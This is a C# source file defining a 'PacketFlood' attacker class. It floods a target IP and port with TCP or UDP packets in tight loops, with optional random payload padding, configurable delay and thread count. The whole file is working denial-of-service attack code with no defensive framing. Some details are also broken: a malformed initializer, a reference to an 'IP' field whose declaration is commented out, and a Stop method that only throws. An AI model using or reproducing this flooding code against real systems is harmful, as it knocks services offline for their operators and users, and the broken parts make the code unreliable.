using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
    public class PacketFlood:IAttacker
    {
        //public int Port,Protocol,Delay,FloodCount;
        int FloodCount;
        public bool Resp,AllowRandom,IsFlooding;
        public string Data;//,IP;
        private int Protocol;
        Thread[] attackingthreads;
        public PacketFlood(string ip, int port, int proto, int delay, bool resp, string data, bool random,int threadcount)
        {
            this.ThreadCount = threadcount;
            attackingthreads = new Thread[ThreadCount];
            this.Target = ip;
            this.Port = port;
            this.Protocol = proto;
            this.Delay = delay;
            this.Resp = resp;
            this.Data = data;
            this.AllowRandom = random;
        }
        public void Start()
        {
            IsFlooding = true;
            BackgroundWorker bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }
        private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf= new byte[System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) )).Length];
				buf= System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					switch (Protocol)
					{
						#region TCP
						case 1:
							socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp){NoDelay = true;};
							try { socket.Connect(RHost); }
							catch { continue; }
							socket.Blocking = Resp;
							try
							{
								while (IsFlooding)
								{
									FloodCount++;
                                    if (AllowRandom)
                                        buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
									socket.Send(buf);
									if (Delay > 0) System.Threading.Thread.Sleep(Delay+1);
								}
							}
							catch 
							{
								Failed++;
							}
							break;
						#endregion
						#region UDP
						case 2:
							socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
							socket.Blocking = Resp;
							try
							{
								while (IsFlooding)
								{
									FloodCount++;
                                    if (AllowRandom)
                                        buf=System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, Functions.RandomString()));
									//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
									//buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null) ));
									//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
									socket.SendTo(buf, SocketFlags.None, RHost);
									if (Delay > 0) System.Threading.Thread.Sleep(Delay+1);
								}
							}
							catch {Failed++;}
							break;
						#endregion
					}
				}
			}
			catch { }
		}
        public override void Stop()
        {
            throw new NotImplementedException();
        }
    }
}